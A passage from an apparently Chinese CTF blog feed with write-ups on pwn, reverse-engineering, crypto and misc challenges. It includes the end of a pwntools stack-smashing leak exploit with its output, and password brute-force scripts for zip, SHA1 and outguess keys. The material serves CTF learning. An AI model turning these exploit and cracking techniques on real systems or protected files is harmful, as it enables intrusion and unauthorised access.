&apos;)puts_add=u64(sh.recv(6)+&quot;\x00\x00&quot;)libc_base=puts_add-0x06f690environ_add=libc_base+0x3c6f38sh.recvuntil(&apos;Please type your guessing flag&apos;)sh.sendline(&quot;a&quot;*296+p64(environ_add))sh.recvuntil(&apos;*** stack smashing detected ***: &apos;)stack_add=u64(sh.recv(6)+&quot;\x00\x00&quot;)sh.recvuntil(&apos;Please type your guessing flag&apos;)sh.sendline(&quot;a&quot;*296+p64(stack_add-360))sh.recvuntil(&apos;*** stack smashing detected ***: &apos;)flag=sh.recvuntil(&quot;&#125;&quot;)print flag</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">parallels@parallels-vm:~$ python guess.py[+] Starting local process &apos;./GUESS&apos;: pid 22240[*] &apos;/home/parallels/GUESS&apos;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x400000)[*] Process &apos;./GUESS&apos; stopped with exit code 0 (pid 22240)flag&#123;just4eriri&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>安恒杯2019年2月月赛</title>
      <link href="/2019/02/24/%E5%AE%89%E6%81%92%E6%9D%AF2019%E5%B9%B42%E6%9C%88%E6%9C%88%E8%B5%9B/"/>
      <url>/2019/02/24/%E5%AE%89%E6%81%92%E6%9D%AF2019%E5%B9%B42%E6%9C%88%E6%9C%88%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<p>鶸只写了crypto，misc，re各一道题orz</p><a id="more"></a><h1 id="cpp"><a href="#cpp" class="headerlink" title="cpp"></a>cpp</h1><p>这题加密啥的倒是不难，就是要找比对的字符串有点不知道去哪找，除了一个“Please input:”就啥也找不到了。</p><p>后来从头再来了一遍，发现了奇怪的地方：</p><p><img src="https://ws2.sinaimg.cn/large/006tKfTcgy1g0hnmpbyjej312u0oujyg.jpg" alt></p><p>“Please input:”上面有一个’g’和’0’，点进去看了一会发现一个函数比较后会打印’g00d’，一路按x往前，最后终于找到了需要比对的字符串“”access denieda””。</p><p>解密脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">s=&quot;access denieda&quot;</span><br><span class="line">temp=[]</span><br><span class="line">for i in range(len(s)):</span><br><span class="line">temp.append(ord(s[i])^i)</span><br><span class="line">for i in range(len(temp)):</span><br><span class="line">if i%3==0:</span><br><span class="line">temp[i]^=0x1f</span><br><span class="line">if i%3==1:</span><br><span class="line">temp[i]^=0x20</span><br><span class="line">if i%3==2:</span><br><span class="line">temp[i]^=0x21</span><br><span class="line">print &apos;&apos;.join([chr(i) for i in temp])</span><br></pre></td></tr></table></figure><p>解密出来的字符串也不是很明显…然而md5之后交了一下发现对了2333</p><h1 id="hahaha"><a href="#hahaha" class="headerlink" title="hahaha"></a>hahaha</h1><p>题目下载了一个压缩包，提示需要密码。</p><p>发现压缩包里有4个6字节的txt和一个flag.pdf。</p><p>以前看过类似的题目，利用crc32爆破出txt的内容，就是压缩包的密码，然后解密得到flag.pdf：</p><p><img src="https://ws3.sinaimg.cn/large/006tKfTcgy1g0hnytbdyxj31bq0ta7am.jpg" alt></p><p>看图可知需要继续爆破，把字符全排列一下，然后sha1后等于给的值就行了。</p><p>一开始沙雕了爆破了很久都没得到flag,后来才想起来flag应该是有格式的，所以shift键只能用在1或2上，加了格式之后秒出结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">visit = [True, True, True, True, True, True, True]</span><br><span class="line">temp = [&quot;&quot; for x in range(0, 7)]</span><br><span class="line">def dfs(position):</span><br><span class="line">    if position == len(arr):</span><br><span class="line">        string=&apos;&apos;.join(temp)</span><br><span class="line">        flag=&quot;flag&#123;&quot;+string+&quot;&#125;&quot;</span><br><span class="line">        if hashlib.sha1(flag).hexdigest()==&apos;e6079c5ce56e781a50f4bf853cdb5302e0d8f054&apos;:</span><br><span class="line">        print flag</span><br><span class="line">        return</span><br><span class="line"> </span><br><span class="line">    for index in range(0,len(arr)):</span><br><span class="line">        if visit[index] == True:</span><br><span class="line">            temp[position] = arr[index]</span><br><span class="line">            visit[index] = False</span><br><span class="line">            dfs(position + 1)</span><br><span class="line">            visit[index] = True</span><br><span class="line"> </span><br><span class="line">arr = [&quot;1&quot;,&quot;@&quot;,&apos;s&apos;,&apos;e&apos;,&apos;h&apos;,&apos;c&apos;,&apos;n&apos;]</span><br><span class="line">dfs(0)</span><br></pre></td></tr></table></figure><h1 id="来玩个游戏吧"><a href="#来玩个游戏吧" class="headerlink" title="来玩个游戏吧"></a>来玩个游戏吧</h1><p>第一关一开始就知道是可以用网站解密的了,然而想了半天不知道该怎么把那个盲文拖下来orz。</p><p>后来拖下来之后解压出了一个32位字符串,前两位是??。</p><p>猜测是前两位不知道的md5，突发奇想加了个10上去就成功解密出hello，第一关就过了。</p><p>第二关需要两个md5相同的文件，我用了fastcoll得到了这样的文件。</p><p>最后的邮件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">送你一封包含flag的邮件：Dear Professional ; Especially for you - this cutting-edge intelligence ! If you no longer wish to receive our publications simply reply with a Subject: of &quot;REMOVE&quot; and you will immediately be removed from our club . This mail is being sent in compliance with Senate bill 2216 , Title 9 ; Section 306 ! THIS IS NOT MULTI-LEVEL MARKETING . Why work for somebody else when you can become rich as few as 35 weeks . Have you ever noticed more people than ever are surfing the web and people will do almost anything to avoid mailing their bills . Well, now is your chance to capitalize on this ! WE will help YOU decrease perceived waiting time by 120% &amp; decrease perceived waiting time by 140% . You can begin at absolutely no cost to you . But don&apos;t believe us ! Mrs Jones of Minnesota tried us and says &quot;I was skeptical but it worked for me&quot; . We assure you that we operate within all applicable laws . Because the Internet operates on &quot;Internet time&quot; you must act now ! Sign up a friend and your friend will be rich too . Warmest regards . Dear Cybercitizen , We know you are interested in receiving red-hot announcement ! We will comply with all removal requests ! This mail is being sent in compliance with Senate bill 1619 ; Title 2 ; Section 301 . This is NOT unsolicited bulk mail ! Why work for somebody else when you can become rich within 53 MONTHS ! Have you ever noticed more people than ever are surfing the web and more people than ever are surfing the web . Well, now is your chance to capitalize on this . We will help you use credit cards on your website plus decrease perceived waiting time by 150% . The best thing about our system is that it is absolutely risk free for you ! But don&apos;t believe us ! Mrs Simpson of Washington tried us and says &quot;Now I&apos;m rich, Rich, RICH&quot; . We assure you that we operate within all applicable laws ! We beseech you - act now ! Sign up a friend and your friend will be rich too . Thank-you for your serious consideration of our offer ! Dear Friend ; This letter was specially selected to be sent to you ! If you no longer wish to receive our publications simply reply with a Subject: of &quot;REMOVE&quot; and you will immediately be removed from our mailing list . This mail is being sent in compliance with Senate bill 2716 , Title 2 ; Section 306 ! This is a ligitimate business proposal . Why work for somebody else when you can become rich inside 33 weeks . Have you ever noticed more people than ever are surfing the web plus more people than ever are surfing the web . Well, now is your chance to capitalize on this ! WE will help YOU SELL MORE and process your orders within seconds . You can begin at absolutely no cost to you . But don&apos;t believe us ! Mrs Jones of Kentucky tried us and says &quot;I was skeptical but it worked for me&quot; ! This offer is 100% legal ! We implore you - act now . Sign up a friend and you&apos;ll get a discount of 50% . God Bless .</span><br></pre></td></tr></table></figure><p>一开始百度栅格密码，啥也百度不到，甚至以为这是栅栏密码试了半天，后来科学上网用google搜了一下，很容易就找到了<a href="http://www.spammimic.com" target="_blank" rel="noopener">解密网站</a>。</p><h1 id="……等待dalao们的wp"><a href="#……等待dalao们的wp" class="headerlink" title="……等待dalao们的wp"></a>……等待dalao们的wp</h1>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>HGAME2019-Say-Muggle-Code a.k.a. SMC</title>
      <link href="/2019/02/12/HGAME2019-Say-Muggle-Code-a-k-a-SMC/"/>
      <url>/2019/02/12/HGAME2019-Say-Muggle-Code-a-k-a-SMC/</url>
      
        <content type="html"><![CDATA[<p>首先SMC，使用python脚本：</p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">i=0x603000</span><br><span class="line">key=123</span><br><span class="line">while 1:</span><br><span class="line">    PatchByte(i,Byte(i)^key)</span><br><span class="line">    i+=1</span><br><span class="line">    key+=1</span><br><span class="line">    if i == 0x603200:</span><br><span class="line">        break</span><br></pre></td></tr></table></figure><p>要求输入的flag长度为39，并且格式为hgame{}。</p><p>同时把括号内的内容分为两半，前面一半用check1检验，后面一半用check2检验。</p><p>check1:</p><p>每个字符异或0xe9后与data1比较，所以可以直接逆运算：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">data1=[0xDE,</span><br><span class="line">0xD1,</span><br><span class="line">0xD8,</span><br><span class="line">0x8C,</span><br><span class="line">0x8F,</span><br><span class="line">0xD9,</span><br><span class="line">0xDF,</span><br><span class="line">0xDE,</span><br><span class="line">0xDF,</span><br><span class="line">0x8C,</span><br><span class="line">0xD8,</span><br><span class="line">0xDA,</span><br><span class="line">0x8C,</span><br><span class="line">0xDC,</span><br><span class="line">0xDD,</span><br><span class="line">0xD8,]</span><br><span class="line">print &apos;&apos;.join([chr(i^0xe9) for i in data1])</span><br></pre></td></tr></table></figure><p>结果为<code>781ef0676e13e541</code>。</p><p>check2:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">_DWORD *__fastcall encrypt(__int64 a1, _DWORD *a2)</span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *result; // rax</span><br><span class="line">  int v3; // [rsp+10h] [rbp-10h]</span><br><span class="line">  signed int i; // [rsp+14h] [rbp-Ch]</span><br><span class="line">  signed int j; // [rsp+18h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v3 = 0;</span><br><span class="line">  for ( i = 0; i &lt;= 31; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (_DWORD *)0x9E3779B9LL;</span><br><span class="line">    v3 -= 0x61C88647;</span><br><span class="line">    for ( j = 0; j &lt;= 3; j += 2 )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_DWORD *)(a1 + 4LL * j) = *(_DWORD *)(4LL * j + a1)</span><br><span class="line">                                + ((*(_DWORD *)(4 * (j + 1LL) + a1) + v3) ^ (16 * *(_DWORD *)(4 * (j + 1LL) + a1) + *a2) ^ ((*(_DWORD *)(4 * (j + 1LL) + a1) &gt;&gt; 5) + a2[1]));</span><br><span class="line">      result = (_DWORD *)(4 * (j + 1LL) + a1);</span><br><span class="line">      *result += (*(_DWORD *)(4LL * j + a1) + v3) ^ (16 * *(_DWORD *)(4LL * j + a1) + a2[2]) ^ ((*(_DWORD *)(4LL * j + a1) &gt;&gt; 5)</span><br><span class="line">                                                                                              + a2[3]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br></pre></td></tr></table></figure><p>TEA。</p><p>解密：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">void decrypt (uint32_t* v, uint32_t* k) &#123;</span><br><span class="line">    uint32_t v0=v[0], v1=v[1], v2=v[2],v3=v[3], sum=0xC6EF3720, i;  </span><br><span class="line">    uint32_t delta=0x9e3779b9;                     </span><br><span class="line">    uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3];   </span><br><span class="line">    for (i=0; i&lt;32; i++) &#123;                         </span><br><span class="line">    v3 -= ((v2*16) + k2) ^ (v2 + sum) ^ ((v2&gt;&gt;5) + k3);</span><br><span class="line">        v2 -= ((v3*16) + k0) ^ (v3 + sum) ^ ((v3&gt;&gt;5) + k1);</span><br><span class="line">        v1 -= ((v0*16) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;5) + k3);</span><br><span class="line">        v0 -= ((v1*16) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;5) + k1);</span><br><span class="line">        sum -= delta;                                   </span><br><span class="line">    &#125;                                              </span><br><span class="line">    v[0]=v0; v[1]=v1; v[2]=v2; v[3]=v3;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">uint32_t flag[4]=&#123;0xbdba0e28,0x38d1cd98,0x3ab63e63,0x535e9dac&#125;;</span><br><span class="line">uint32_t key[4]=&#123;0x5b3e0f37,0x0c3b0d3d,0x5d6e5f3a,0x31390d38&#125;;</span><br><span class="line">decrypt(flag,key);</span><br><span class="line">for (int i=0;i&lt;4;i++)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;%x &quot;,flag[i]);</span><br><span class="line">&#125;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然而并没有得到正确的后半部分23333</p><hr><p>鬼知道当时哪里搞来的flag和key……</p><p>看了<a href="https://www.52pojie.cn/thread-889005-1-1.html" target="_blank" rel="noopener">大佬的wp</a>之后才发现自己flag和key完全不对orz</p><p>正确的flag直接从data2处取就行了。</p><p>key的话是利用6-22位异或，然而我一直不知道哪里出了错，只有第一位和和第二位是正确的。后来通过dalao的key反推发现，异或只在<code>&quot;781ef0676e13e541&quot;</code>上进行，但是我写脚本时却利用了异或之后的值继续异或，这也是只有一二位正确的原因。</p><p>正确flag与key：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">key[4] = &#123;0x54090f37,0x01065603, 0x02545301, 0x05015056&#125;;</span><br><span class="line">flag[4] =&#123;0xd240f52f,0x728cca9d,0xb6379fd3, 0xfba1a736&#125;;</span><br></pre></td></tr></table></figure><p>改正后跑出后半部分：<br><code>64313964 66656265 31633236 66363439</code></p><p>都是16进制，转换为字符得到：<br><code>d91debef62c1946f</code></p><p>最终flag：hgame{781ef0676e13e541d91debef62c1946f}</p><p>简直回到了高中做数学题的时候，知道怎么做但是最后答案不对，还一直不到哪里错了orz</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>outguess</title>
      <link href="/2019/02/10/outguess/"/>
      <url>/2019/02/10/outguess/</url>
      
        <content type="html"><![CDATA[<p>记录一下记录一下。</p><p>HGAME2019WEEK3的misc1。</p><a id="more"></a><p>题目文件为一个mp4，下载下来看了一遍就GG了。</p><p>之后题目给了hint：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hint1:DeEgger Embedder</span><br><span class="line">hint2:outguess</span><br></pre></td></tr></table></figure><p>直接对着上网去搜就行了，首先使用DeEgger Embedder把视频提取一下，得到一个exe文件，查看hex发现应该是jpg文件，改好后缀后就该用outguess了。</p><p>outguess使用方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">outguess -k key -r xxx.jpg xxx.txt</span><br></pre></td></tr></table></figure><p>但是这里密码是需要自己来爆破的，题目提示了是kali里的rockyou.txt里的密码，虽然我没装kali但是网上也可以找到这个文件，写个脚本把符合要求的密码全部写到另一个文件里，然后开始爆破。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">f=open(&quot;sec.txt&quot;,&apos;rb&apos;) </span><br><span class="line">line=f.readline()</span><br><span class="line">i=1</span><br><span class="line">while line:</span><br><span class="line">command=&quot;outguess -k &quot;+line.replace(&quot;\n&quot;,&quot;&quot;)+&quot; -r /Users/4eriri/Downloads/flag.jpg /Users/4eriri/Downloads/&quot;+str(i)+&quot;.txt&quot;</span><br><span class="line">os.system(command)</span><br><span class="line">line=f.readline()</span><br><span class="line">i+=1</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>这样每次爆破得到的文件就会以次数命名保存下来，然后按文件大小排序一下，那些几十个字节大小的txt就很有可能是正确密码爆破得到的。</p><p>最后在206.txt中发现了flag，正确的key是<code>securitypassword</code>。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>HGAME2019-Math简单</title>
      <link href="/2019/02/08/Math%E7%AE%80%E5%8D%95/"/>
      <url>/2019/02/08/Math%E7%AE%80%E5%8D%95/</url>
      
        <content type="html"><![CDATA[<p>…解一个三十二元一次方程组得到flag，再次练习了一下使用z3求解。</p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span 